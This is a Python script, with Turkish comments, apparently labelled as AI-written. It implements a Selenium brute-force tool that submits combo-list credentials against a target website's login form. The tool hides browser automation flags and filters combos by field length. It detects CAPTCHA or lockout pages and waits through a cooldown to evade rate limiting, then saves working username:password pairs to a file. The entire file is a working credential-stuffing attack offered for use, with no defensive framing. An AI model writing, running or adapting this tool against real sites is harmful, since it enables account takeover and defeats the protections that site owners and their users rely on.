# --- AI SIGNATURE: SMART-RETRY-RATE-LIMIT-SCRIPT ---
import argparse
import sys
import time
from tqdm import tqdm
from colorama import Fore, Style, init

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.common.exceptions import NoSuchElementException, WebDriverException, TimeoutException
except ImportError:
    print(f"{Fore.RED}[!] Selenium kütüphanesi bulunamadı. Lütfen 'pip install selenium' ile kurun.")
    sys.exit(1)

init(autoreset=True)

def set_input_value_and_trigger_events(driver, element, value):
    """Input değerini JS ile set eder ve modern frameworklerin kullandığı olayları tetikler."""
    driver.execute_script("""
        var input = arguments[0];
        var value = arguments[1];
        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
        nativeInputValueSetter.call(input, value);
        var event = new Event('input', { bubbles: true });
        input.dispatchEvent(event);
        var event2 = new Event('change', { bubbles: true });
        input.dispatchEvent(event2);
    """, element, value)

def initialize_driver(browser, headless):
    """Belirtilen tarayıcıyı başlatır ve ayarları yapar."""
    print(f"DEBUG: Tarayıcı '{browser}' için ayarlar yapılıyor.")
    if browser == 'chrome':
        from selenium.webdriver.chrome.options import Options as ChromeOptions
        options = ChromeOptions()
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
    else: # firefox
        from selenium.webdriver.firefox.options import Options as FirefoxOptions
        options = FirefoxOptions()

    if headless:
        print(f"DEBUG: {browser} headless (arka plan) modda çalıştırılıyor.")
        options.add_argument('--headless')
    else:
        print(f"DEBUG: {browser} görünür tarayıcı modunda çalıştırılıyor.")

    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    options.add_argument('--window-size=1280x800')
    
    print(f"DEBUG: {browser} tarayıcı başlatılıyor...")
    if browser == 'chrome':
        driver = webdriver.Chrome(options=options)
    else:
        driver = webdriver.Firefox(options=options)
    print("DEBUG: Tarayıcı başlatıldı.")
    return driver

print("DEBUG: Script başladı.")

parser = argparse.ArgumentParser(description="Akıllı, rate-limit ve uzunluk kontrolü yapan Selenium brute force aracı.")
parser.add_argument('--url', required=True, help='Hedef login sayfası URL')
parser.add_argument('--combo', required=True, help='Combo wordlist dosyası (username:password)')
parser.add_argument('--browser', default='firefox', choices=['chrome', 'firefox'], help='Kullanılacak tarayıcı')
parser.add_argument('--headless', action='store_true', help='Tarayıcıyı arka planda çalıştır')
parser.add_argument('--rate-limit-after', type=int, default=10, help='Kaç hatalı denemeden sonra rate-limit kontrolü yapılsın')
parser.add_argument('--cooldown-time', type=int, default=300, help='Rate-limit algılanırsa beklenecek süre (saniye)')
args = parser.parse_args()
print("DEBUG: Argümanlar okundu.")

# URL Düzeltme
args.url = args.url.strip()
if args.url.startswith("http//"): args.url = "http://" + args.url[6:]
elif args.url.startswith("https//"): args.url = "https://" + args.url[7:]
if not (args.url.startswith("http://") or args.url.startswith("https://")):
    print(f"{Fore.RED}[!] Geçersiz URL formatı.")
    sys.exit(1)

# Ana Mantık
success_log = open('success.txt', 'w', encoding='utf-8')
driver = None
current_combo_index = 0

try:
    # Tarayıcıyı wordlist'i filtrelemek için geçici olarak başlat
    driver = initialize_driver(args.browser, args.headless)
    driver.set_page_load_timeout(60)
    driver.get(args.url)
    time.sleep(5)
    print("[+] Ana sayfaya erişildi, alan uzunlukları kontrol ediliyor.")

    form = driver.find_element(By.TAG_NAME, 'form')
    user_input = form.find_element(By.CSS_SELECTOR, "input[type='text'], input[type='email']")
    pass_input = form.find_element(By.CSS_SELECTOR, "input[type='password']")
    
    # UZUNLUK TESPİTİ
    user_min = int(user_input.get_attribute('minlength') or 1)
    user_max = int(user_input.get_attribute('maxlength') or 256)
    pass_min = int(pass_input.get_attribute('minlength') or 1)
    pass_max = int(pass_input.get_attribute('maxlength') or 256)
    
    print(f"[*] Alan gereksinimleri tespit edildi:")
    print(f"    Kullanıcı Adı: min={user_min}, max={user_max} karakter")
    print(f"    Şifre: min={pass_min}, max={pass_max} karakter")
    
    driver.quit() # Geçici tarayıcıyı kapat
    driver = None

    # Wordlist Okuma ve FİLTRELEME
    try:
        with open(args.combo, encoding='utf-8', errors='ignore') as f:
            combos = [tuple(line.strip().split(':', 1)) for line in f if ':' in line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Wordlist dosyası bulunamadı: {args.combo}")
        sys.exit(1)
        
    original_combo_count = len(combos)
    combos = [
        (user, pwd) for user, pwd in combos
        if user_min <= len(user) <= user_max and pass_min <= len(pwd) <= pass_max
    ]
    print(f"[+] {original_combo_count} combo yüklendi, {len(combos)} tanesi uzunluk kriterlerine uyuyor.")
    if not combos:
        print(f"{Fore.YELLOW}[!] Wordlist'te uygun uzunlukta kombinasyon bulunamadı.")
        sys.exit(1)

    # Ana döngü başlıyor
    while current_combo_index < len(combos):
        try:
            driver = initialize_driver(args.browser, args.headless)
            driver.set_page_load_timeout(60)
            driver.get(args.url)
            time.sleep(5)
            print("[+] Ana sayfaya erişildi.")

            form = driver.find_element(By.TAG_NAME, 'form')
            user_input = form.find_element(By.CSS_SELECTOR, "input[type='text'], input[type='email']")
            pass_input = form.find_element(By.CSS_SELECTOR, "input[type='password']")
            print(f"[+] Login formu bulundu: user='{user_input.get_attribute('name')}', pass='{pass_input.get_attribute('name')}'")

            print("DEBUG: Başarısız giriş denemesiyle referans alınıyor...")
            set_input_value_and_trigger_events(driver, user_input, "wronguser")
            set_input_value_and_trigger_events(driver, pass_input, "wrongpass")
            form.submit()
            time.sleep(3)
            fail_url = driver.current_url
            fail_html = driver.page_source
            print(f"DEBUG: Başarısızlık referans URL'i: {fail_url}")
            
            consecutive_failures = 0
            
            with tqdm(initial=current_combo_index, total=len(combos), desc="Kombinasyonlar deneniyor") as pbar:
                for i in range(current_combo_index, len(combos)):
                    username, password = combos[i]
                    try:
                        if driver.current_url != args.url: driver.get(args.url); time.sleep(2)
                        
                        form = driver.find_element(By.TAG_NAME, 'form')
                        user_input = form.find_element(By.CSS_SELECTOR, "input[type='text'], input[type='email']")
                        pass_input = form.find_element(By.CSS_SELECTOR, "input[type='password']")

                        set_input_value_and_trigger_events(driver, user_input, username)
                        set_input_value_and_trigger_events(driver, pass_input, password)
                        time.sleep(0.1)
                        form.submit()
                        time.sleep(3)

                        if driver.current_url != fail_url or driver.page_source != fail_html:
                            tqdm.write(Fore.GREEN + Style.BRIGHT + f"\n[!!!] BAŞARILI: {username}:{password}")
                            success_log.write(f"{username}:{password}\n"); success_log.flush()
                            consecutive_failures = 0
                        else:
                            consecutive_failures += 1

                        # RATE LIMIT KONTROLÜ
                        if consecutive_failures >= args.rate_limit_after:
                            pbar.set_postfix_str("Rate-limit kontrolü yapılıyor...")
                            current_page_html = driver.page_source
                            if "captcha" in current_page_html.lower() or "too many attempts" in current_page_html.lower():
                                 tqdm.write(Fore.YELLOW + f"\n[!] Rate-limit veya CAPTCHA algılandı! {args.cooldown_time} saniye bekleniyor...")
                                 raise WebDriverException("Rate limit/CAPTCHA detected")
                            else:
                                consecutive_failures = 0 # Gerçek bir rate limit değilse sayacı sıfırla

                    except (NoSuchElementException, TimeoutException):
                        pbar.set_postfix_str("Form hatası, devam ediliyor...", refresh=True); time.sleep(1)
                    
                    current_combo_index = i + 1
                    pbar.update(1)

        except WebDriverException as e:
            print(Fore.YELLOW + f"\n[!] Tarayıcı hatası veya rate-limit: {e}")
            if driver: driver.quit()
            print(f"DEBUG: {args.cooldown_time} saniye soğuma süresi başlatıldı.")
            time.sleep(args.cooldown_time)
            print("DEBUG: Soğuma süresi bitti, tarayıcı yeniden başlatılacak.")
            continue # Ana while döngüsünün başına dön
        except Exception as e:
            print(f"\n{Fore.RED}KRİTİK HATA: {e}")
            break # Kritik hatada döngüden tamamen çık
finally:
    if driver: driver.quit()
    success_log.close()
    print("\n[+] Tarama tamamlandı.")

# --- AI SIGNATURE: SMART-RETRY-RATE-LIMIT-SCRIPT-BITIS --- 